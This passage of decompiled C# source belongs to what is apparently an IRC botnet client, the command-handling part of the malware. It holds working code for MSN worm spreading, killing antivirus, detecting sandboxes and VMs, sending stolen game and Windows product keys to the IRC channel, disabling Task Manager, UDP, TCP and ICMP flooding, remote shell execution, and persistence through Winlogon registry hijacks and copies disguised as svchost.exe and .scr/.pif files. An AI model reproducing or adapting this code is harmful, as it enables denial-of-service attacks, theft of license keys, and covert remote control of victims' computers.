									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003Started msn share spreading routine");
									MSN_Share_drop();
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError17)
								{
									ProjectData.SetProjectError(projectError17);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!msn"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003Started msn spreading routine");
									try
									{
										msn_spread();
									}
									catch (Exception projectError18)
									{
										ProjectData.SetProjectError(projectError18);
										ProjectData.ClearProjectError();
									}
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError19)
								{
									ProjectData.SetProjectError(projectError19);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!killav"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003killes AV succesfully");
									if (Antis.antiKAV())
									{
										ProjectData.EndApp();
									}
									Antis.AntiWireShark();
									if (Antis.antiSandboxie())
									{
										ProjectData.EndApp();
									}
									if (Antis.antiAnubis())
									{
										ProjectData.EndApp();
									}
									if (Antis.antiAnubis2())
									{
										ProjectData.EndApp();
									}
									if (Antis.AntiVirtualBox())
									{
										ProjectData.EndApp();
									}
									if (Antis.AntiVmWare())
									{
										ProjectData.EndApp();
									}
									if (Antis.AntiVirtualPC())
									{
										ProjectData.EndApp();
									}
									killall();
									ircbot.IRCwriter.Flush();
								}
								catch (Exception projectError20)
								{
									ProjectData.SetProjectError(projectError20);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!remove"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003removed");
									FileStream stream7 = new FileStream("C:\\windows\\system32\\rem.bat", FileMode.Create, FileAccess.Write);
									StreamWriter streamWriter8 = new StreamWriter(stream7);
									streamWriter8.BaseStream.Seek(0L, SeekOrigin.End);
									streamWriter8.WriteLine("@echo off & break off");
									streamWriter8.WriteLine("del C:\\WINDOWS\\system32\\dllcache\\recycled.exe /f");
									streamWriter8.WriteLine("del C:\\WINDOWS\\system32\\drivers\\svchost.exe /f");
									streamWriter8.Close();
									Process.Start("C:\\windows\\system32\\rem.bat");
								}
								catch (Exception projectError21)
								{
									ProjectData.SetProjectError(projectError21);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!cdkeys"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003sims3 Key:" + sims3);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003cod key:" + COD);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003cod2 key:" + COD2);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003cod4 key:" + COD4);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003cod5 key:" + COD5);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003HL key:" + HL);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003cs key:" + CS);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003Windows + Office key:" + Win + " the key is probably base64 encoded use this for decoding http://www.motobit.com/util/base64-decoder-encoder.asp");
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003battlefron2 Key:" + bf2);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003battlefield2 key:" + baf2);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003company of heroes key:" + coh);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003mount and blade key:" + mb);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003supreme commander key:" + supc);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003HL key:" + HL);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003battlefield 1942 key:" + bf42);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003Command and Conquer Generals key:" + cacg);
								}
								catch (Exception projectError22)
								{
									ProjectData.SetProjectError(projectError22);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!limit"))
							{
								try
								{
									Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
									Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003succeeded");
								}
								catch (Exception projectError23)
								{
									ProjectData.SetProjectError(projectError23);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!udp"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003UDP flooding now");
									while (true)
									{
										bla = ircbot.inputLine.Split(new char[1] { ' ' });
										UdpClient udpClient = new UdpClient();
										byte[] array10 = new byte[0];
										IPAddress addr = IPAddress.Parse(Conversions.ToString(NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)));
										udpClient.Connect(addr, Conversions.ToInteger(NewLateBinding.LateIndexGet((object)bla, new object[1] { 2 }, (string[])null)));
										array10 = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAA!/asldifrhaslkdfhaseoirfhasdhfjasdzf483975634597328528934tzheufgz34975638q9ruweirf \u200b hsdkjvnwu45z6384975weuirhjsfndjvzw438563q84ruwajfjsadfhdfhgq349875q390ruf)=/()%&§%&%");
										udpClient.Send(array10, array10.Length);
									}
								}
								catch (Exception projectError24)
								{
									ProjectData.SetProjectError(projectError24);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!port"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003port scanning now");
									try
									{
										new TcpClient(Conversions.ToString(NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)bla, new object[1] { 2 }, (string[])null)));
										ircbot.IRCwriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("PRIVMSG " + ircbot.CHANNEL, " :"), " "), "\u0003"), "port"), NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)), (object)"on"), NewLateBinding.LateIndexGet((object)bla, new object[1] { 2 }, (string[])null)), (object)"is open"));
									}
									catch (SocketException ex)
									{
										ProjectData.SetProjectError((Exception)ex);
										SocketException ex2 = ex;
										if (ex2.ErrorCode == 10061)
										{
											ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003port is not used");
										}
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError25)
								{
									ProjectData.SetProjectError(projectError25);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!icmp"))
							{
								try
								{
									string inputLine = ircbot.inputLine;
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003ICMP flooding now");
									Interaction.Shell("ping -t -l 65000 -w 10000 " + inputLine.Replace(" !icmp", string.Empty), (AppWinStyle)2, false, -1);
								}
								catch (Exception projectError26)
								{
									ProjectData.SetProjectError(projectError26);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!tcp"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003TCP flooding now");
									bla = ircbot.inputLine.Split(new char[1] { ' ' });
									while (true)
									{
										TcpClient tcpClient = new TcpClient();
										object[] array2 = new object[2];
										object[] array11 = array2;
										Array array12 = bla;
										object[] array13 = new object[1];
										object[] array14 = array13;
										int num = 1;
										array14[0] = 1;
										array11[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array12, array13, (string[])null));
										object[] array15 = array2;
										Array array16 = bla;
										object[] array7 = new object[1];
										object[] array17 = array7;
										int num2 = 2;
										array17[0] = 2;
										array15[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array16, array7, (string[])null));
										object[] array5 = array2;
										object[] array18 = array5;
										bool[] array9 = new bool[2] { true, true };
										NewLateBinding.LateCall((object)tcpClient, (Type)null, "Connect", array18, (string[])null, (Type[])null, array9, true);
										if (array9[0])
										{
											NewLateBinding.LateIndexSetComplex((object)bla, new object[2]
											{
												num,
												RuntimeHelpers.GetObjectValue(array5[0])
											}, (string[])null, true, false);
										}
										if (array9[1])
										{
											NewLateBinding.LateIndexSetComplex((object)bla, new object[2]
											{
												num2,
												RuntimeHelpers.GetObjectValue(array5[1])
											}, (string[])null, true, false);
										}
										NetworkStream stream8 = tcpClient.GetStream();
										if (stream8.CanWrite & stream8.CanRead)
										{
											byte[] bytes = Encoding.ASCII.GetBytes("§$%/%/(assssssssdfffffffff-.m,M:ölüä#opü#löä+äää%&/($%&%$&§$/%$/(&&/(%&/(§$%&/$%&/$%&/");
											stream8.Write(bytes, 0, bytes.Length);
											byte[] buffer = new byte[tcpClient.ReceiveBufferSize + 1];
											stream8.Read(buffer, 0, tcpClient.ReceiveBufferSize);
										}
									}
								}
								catch (Exception projectError27)
								{
									ProjectData.SetProjectError(projectError27);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!msgbox"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003send msgbox");
									string inputLine2 = ircbot.inputLine;
									Interaction.MsgBox((object)inputLine2.Replace(" !msgbox", string.Empty), (MsgBoxStyle)0, (object)null);
								}
								catch (Exception projectError28)
								{
									ProjectData.SetProjectError(projectError28);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.EndsWith("!bing"))
							{
								try
								{
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " : \u0003bong");
								}
								catch (Exception projectError29)
								{
									ProjectData.SetProjectError(projectError29);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!run"))
							{
								try
								{
									bla = ircbot.inputLine.Split(new char[1] { ' ' });
									Type typeFromHandle = typeof(Process);
									object[] array19 = new object[1];
									object[] array20 = array19;
									Array array21 = bla;
									object[] array22 = new object[1];
									object[] array23 = array22;
									int num2 = 1;
									array23[0] = 1;
									array20[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array21, array22, (string[])null));
									object[] array13 = array19;
									object[] array24 = array13;
									bool[] array9 = new bool[1] { true };
									NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array24, (string[])null, (Type[])null, array9, true);
									if (array9[0])
									{
										NewLateBinding.LateIndexSetComplex((object)bla, new object[2]
										{
											num2,
											RuntimeHelpers.GetObjectValue(array13[0])
										}, (string[])null, true, false);
									}
									ircbot.IRCwriter.WriteLine(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("PRIVMSG " + ircbot.CHANNEL, " :"), " "), "\u0003"), "executed"), NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)));
								}
								catch (Exception projectError30)
								{
									ProjectData.SetProjectError(projectError30);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!site"))
							{
								try
								{
									bla = ircbot.inputLine.Split(new char[1] { ' ' });
									ircbot.IRCwriter.WriteLine(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("PRIVMSG " + ircbot.CHANNEL, " :"), " "), "\u0003"), "started website"), NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)));
									new Process();
									Process.Start("IExplore.exe", Conversions.ToString(NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)));
								}
								catch (Exception projectError31)
								{
									ProjectData.SetProjectError(projectError31);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							if (ircbot.inputLine.Contains("!shell"))
							{
								try
								{
									bla = ircbot.inputLine.Split(new char[1] { ' ' });
									ircbot.IRCwriter.WriteLine(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("PRIVMSG " + ircbot.CHANNEL, " :"), " "), "\u0003"), "executed"), NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)));
									Interaction.Shell(Conversions.ToString(NewLateBinding.LateIndexGet((object)bla, new object[1] { 1 }, (string[])null)), (AppWinStyle)2, false, -1);
								}
								catch (Exception projectError32)
								{
									ProjectData.SetProjectError(projectError32);
									ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + streamWriter4.ToString());
									ircbot.IRCwriter.Flush();
									ProjectData.ClearProjectError();
								}
							}
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", (object)"explorer.exe, C:\\windows\\system32\\drivers\\svchost.exe");
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "UIHost", (object)"logonui.exe, C:\\WINDOWS\\system32\\dllcache\\recycled.exe");
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", (object)("C:\\WINDOWS\\SYSTEM32\\Userinit.exe," + Path.GetTempPath() + "win_update.exe"));
							try
							{
								File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\recycled.exe");
								File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\myporn.scr");
								File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\doc.pif");
								File.Copy(Application.get_ExecutablePath(), "C:\\windows\\system32\\drivers\\svchost.exe");
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								ProjectData.ClearProjectError();
							}
							try
							{
							}
							catch (Exception projectError34)
							{
								ProjectData.SetProjectError(projectError34);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							ircbot.IRCwriter.Close();
							ircbot.irc.Close();
						}
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ircbot.IRCwriter.WriteLine("PRIVMSG " + ircbot.CHANNEL + " :\u00037 error : " + ex4.ToString());
					ircbot.IRCwriter.Flush();
					Thread.Sleep(2000);
					string[] args = new string[0];
					ircbot.Main(args);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
